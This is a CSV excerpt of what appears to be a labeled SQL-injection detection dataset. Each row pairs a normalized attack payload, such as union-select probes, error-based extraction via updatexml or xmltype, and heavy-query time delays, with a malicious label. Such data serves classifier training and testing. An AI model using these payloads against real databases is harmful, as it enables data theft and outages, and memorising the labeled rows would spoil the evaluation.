row_index,payload_norm,label,sqli_type_hint
8490,"1"" ) where 3250 = 3250 union all select null#",1,
8491,"1%' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( '%' = '",1,
8492,"1' ) ) ) union all select null,null,null,null,null,null,null,null#",1,
8493,-6855' ) or 8519 = 9248,1,
8494,"-4764 ) where 8200 = 8200 union all select 8200,8200,8200,8200--",1,
8495,"1"" ) ) as qrrx where 4633 = 4633 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
8496,"1"" ) ) as gqxk where 9199 = 9199 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",1,
8497,"1'+ ( select lgkd where 7801 = 7801 and elt ( 4249 = 4249,7259 ) ) +'",1,
8498,"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) -- btqa",1,
8499,"1"" ) ) as lfte where 3811 = 3811 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,
8500,1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),1,
8501,"1 ) ) as bgdm where 3473 = 3473 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1,
8502,"1' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'lwir' like 'lwir",1,
8503,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",1,
8504,"-3063%"" ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""%"" = """,1,
8505,-5389'|| ( select 'gggl' where 1020 = 1020 union all select 1020#,1,
8506,"1%"" ) union all select null,null,null#",1,
8507,"1"" where 9172 = 9172 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,
8508,"1"" or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
8509,"-8013%"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""%"" = """,1,
8510,select ( case when ( 4043 = 5276 ) then 4043 else 4043* ( select 4043 from information_schema.character_sets ) end ) #,1,
8511,"1 ) where 8691 = 8691 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
8512,"-3555' ) or make_set ( 9354 = 9354,7185 ) and ( 'papr' = 'papr",1,
8513,"1%"" ) ) union all select null,null,null,null,null--",1,
8514,-6473' union all select 7537#,1,
8515,1'+ ( select 'yahq' where 6974 = 6974 union all select null--,1,
8516,"1' ) where 8268 = 8268 union all select null,null,null,null--",1,
8517,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( '%' = '",1,
8518,1' ) ) and ( 3020 = 3020 ) *6703 and ( ( 'pfal' = 'pfal,1,
8519,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%' = '",1,
